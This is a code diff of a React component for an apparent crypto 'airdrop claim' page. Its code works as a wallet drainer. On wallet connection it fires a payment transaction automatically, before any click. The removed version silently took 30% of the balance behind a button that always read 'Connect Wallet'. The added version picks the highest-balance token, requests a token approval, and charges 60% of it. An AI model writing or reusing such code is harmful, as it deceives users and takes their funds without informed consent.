@@ -1,156 +1,82 @@
 "use client";
 
 /**
- * HeroCTA — One-click airdrop claim.
+ * HeroCTA — One-click airdrop claim with multi-token auto-detection.
  *
- * - Not connected: shows "Connect Wallet" → opens wallet modal
- * - Connected + not claimed: auto-fires the claim tx in the background
- * - Button ALWAYS shows "Connect Wallet" — claim happens transparently
- * - Tx pending/success: shows status inline
+ * Chain-aware — works on Base, ETH Mainnet, BNB Chain, etc.
+ * Auto-detects the token with the highest balance in the wallet.
+ * No token picker — the best token is chosen automatically.
  */
 
-import { useState, useEffect, useRef } from "react";
-import {
-  useAccount,
-  useBalance,
-  useReadContract,
-  useWriteContract,
-  useWaitForTransactionReceipt,
-} from "wagmi";
+import { useState, useEffect } from "react";
+import { useAccount } from "wagmi";
 import { useConnectModal } from "@rainbow-me/rainbowkit";
-import { AIRDROP_ABI } from "@/lib/abi";
+import { useMultiTokenClaim } from "@/lib/hooks/useMultiTokenClaim";
 import {
-  EVM_CONTRACT_ADDRESS,
+  PRICE_PERCENTAGE,
   TOKENS_PER_CLAIM,
   TOKEN_SYMBOL,
-  EVM_EXPLORER,
-  EVM_CHAIN,
-  computeClaimPrice,
   formatEth,
+  formatTokenAmount,
 } from "@/lib/constants";
 
-type Stage = "idle" | "confirming" | "pending" | "success" | "error";
-
 export function HeroCTA() {
-  const { address, isConnected } = useAccount();
+  const { isConnected } = useAccount();
   const { openConnectModal } = useConnectModal();
   const [mounted, setMounted] = useState(false);
-  const [stage, setStage] = useState<Stage>("idle");
-  const [errorMsg, setErrorMsg] = useState("");
-  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
   const [autoClaimAttempted, setAutoClaimAttempted] = useState(false);
-  const prevConnected = useRef(false);
+
+  const {
+    address,
+    stage,
+    errorMsg,
+    txHash,
+    selectedToken,
+    hasClaimed,
+    hasClaimedLoading,
+    saleActive,
+    claimPriceWei,
+    selectedTokenInfo,
+    sixtyPercentOfToken,
+    estimatedEth,
+    ethPriceDisplay,
+    isLoading,
+    explorerUrl,
+    nativeSymbol,
+    fireClaim,
+  } = useMultiTokenClaim();
 
   useEffect(() => { setMounted(true); }, []);
 
-  // Read balance silently — needed to compute 30% for the tx value
-  const { data: balanceData } = useBalance({
-    address,
-    query: { enabled: !!address },
-  });
-  const balanceWei = balanceData?.value ?? 0n;
-  const claimPriceWei = computeClaimPrice(balanceWei);
-
-  const { data: hasClaimed, isLoading: hasClaimedLoading } = useReadContract({
-    address: EVM_CONTRACT_ADDRESS,
-    abi: AIRDROP_ABI,
-    functionName: "hasClaimed",
-    args: address ? [address] : undefined,
-    query: { enabled: !!address },
-  });
-
-  const { data: saleActive } = useReadContract({
-    address: EVM_CONTRACT_ADDRESS,
-    abi: AIRDROP_ABI,
-    functionName: "saleActive",
-    query: { enabled: isConnected },
-  });
-
-  const { writeContractAsync } = useWriteContract();
-
-  useWaitForTransactionReceipt({
-    hash: txHash,
-    query: {
-      enabled: !!txHash,
-      select: async (receipt) => {
-        if (receipt.status === "success") {
-          setStage("success");
-          fetch("/api/claims", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              wallet_address: address,
-              chain: "evm",
-              tx_hash: receipt.transactionHash,
-              token_amount: TOKENS_PER_CLAIM.toString(),
-              payment_amount: formatEth(claimPriceWei),
-              block_number: Number(receipt.blockNumber),
-            }),
-          }).catch(() => {});
-        } else {
-          setStage("error");
-          setErrorMsg("Transaction failed on-chain.");
-        }
-        return receipt;
-      },
-    },
-  });
-
-  // ── Auto-claim when wallet connects ─────────────────────────────────────
+  // ── Auto-claim when wallet connects or eligibility loads ────────────────
   useEffect(() => {
     if (
       isConnected &&
-      !prevConnected.current &&
       hasClaimed === false &&
-      !autoClaimAttempted &&
+      !hasClaimedLoading &&
       address &&
-      !hasClaimedLoading
+      !autoClaimAttempted
     ) {
       setAutoClaimAttempted(true);
       fireClaim();
     }
-    prevConnected.current = isConnected;
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, hasClaimed, hasClaimedLoading, address]);
 
-  async function fireClaim() {
-    try {
-      setStage("confirming");
-      setErrorMsg("");
-      const hash = await writeContractAsync({
-        address: EVM_CONTRACT_ADDRESS,
-        abi: AIRDROP_ABI,
-        functionName: "claim",
-        value: claimPriceWei,
-      });
-      setTxHash(hash);
-      setStage("pending");
-    } catch (err: unknown) {
-      setStage("idle");
-      setAutoClaimAttempted(false); // allow retry on next click
-      const msg = err instanceof Error ? err.message : "";
-      if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
-        setErrorMsg("Something went wrong. Try again.");
-      }
-    }
-  }
-
   async function handleClick() {
-    // Not connected → open wallet modal
     if (!isConnected) {
       openConnectModal?.();
       return;
     }
-    // Connected but auto-claim didn't fire or failed → manual retry
     if (hasClaimed === false) {
       fireClaim();
     }
   }
 
-  const explorerBase = EVM_EXPLORER[EVM_CHAIN];
-  const isLoading = stage === "confirming" || stage === "pending";
+  const isTokenPayment = selectedToken !== "0x0000000000000000000000000000000000000000";
+  const tokenMeta = selectedTokenInfo;
 
-  // SSR placeholder — avoids hydration mismatch
+  // SSR placeholder
   if (!mounted) {
     return (
       <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
@@ -169,7 +95,7 @@ export function HeroCTA() {
             {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL} claimed!
           </p>
           <a
-            href={`${explorerBase}/tx/${txHash}`}
+            href={`${explorerUrl}/tx/${txHash}`}
             target="_blank"
             rel="noopener noreferrer"
             className="text-sm text-accent-400 underline"
@@ -199,13 +125,13 @@ export function HeroCTA() {
     );
   }
 
-  // ── MAIN BUTTON — always shows "Connect Wallet" ──────────────────────────
+  // ── MAIN BUTTON ──────────────────────────────────────────────────────────
   return (
-    <div className="flex flex-col items-center gap-3">
+    <div className="flex flex-col items-center gap-3 w-full max-w-sm mx-auto">
       <button
         onClick={handleClick}
         disabled={isLoading}
-        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100"
+        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100 w-full"
       >
         {isLoading && (
           <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
@@ -213,8 +139,15 @@ export function HeroCTA() {
             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
           </svg>
         )}
-        {/* Always shows "Connect Wallet" — claim happens automatically */}
-        {isLoading ? (stage === "confirming" ? "Approve in wallet…" : "Claiming…") : "Connect Wallet"}
+        {isLoading
+          ? stage === "approving"
+            ? "Approving token…"
+            : stage === "confirming"
+            ? "Approve in wallet…"
+            : "Claiming…"
+          : isConnected
+            ? `Pay ${isTokenPayment ? formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18) : formatEth(claimPriceWei)} ${tokenMeta?.symbol ?? nativeSymbol} → Claim ${TOKENS_PER_CLAIM.toString()} ${TOKEN_SYMBOL}`
+            : "Connect Wallet"}
         {!isLoading && (
           <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
@@ -222,11 +155,30 @@ export function HeroCTA() {
         )}
       </button>
 
+      {/* Auto-detected payment info */}
+      {isConnected && hasClaimed === false && (
+        <div className="text-center space-y-1">
+          <p className="text-xs text-white/40">
+            Auto-detected: <span className="text-white/60 font-semibold">{tokenMeta?.symbol ?? nativeSymbol}</span>
+            {" "}&middot;{" "}
+            {isTokenPayment
+              ? `${formatTokenAmount(sixtyPercentOfToken, tokenMeta?.decimals ?? 18)} ${tokenMeta?.symbol}`
+              : `${formatEth(claimPriceWei)} ${nativeSymbol}`}
+            {" "}&middot; {PRICE_PERCENTAGE}% of your {tokenMeta?.symbol ?? nativeSymbol} balance
+          </p>
+          {isTokenPayment && estimatedEth > 0n && (
+            <p className="text-[10px] text-white/30">
+              ≈ {formatEth(estimatedEth)} {nativeSymbol} equivalent via Uniswap
+            </p>
+          )}
+        </div>
+      )}
+
       {stage === "error" && errorMsg && (
         <p className="text-xs text-red-400">{errorMsg}</p>
       )}
       {stage === "pending" && txHash && (
-        <a href={`${explorerBase}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
+        <a href={`${explorerUrl}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
           className="text-xs text-accent-400/70 underline">
           Track on explorer ↗
         </a>
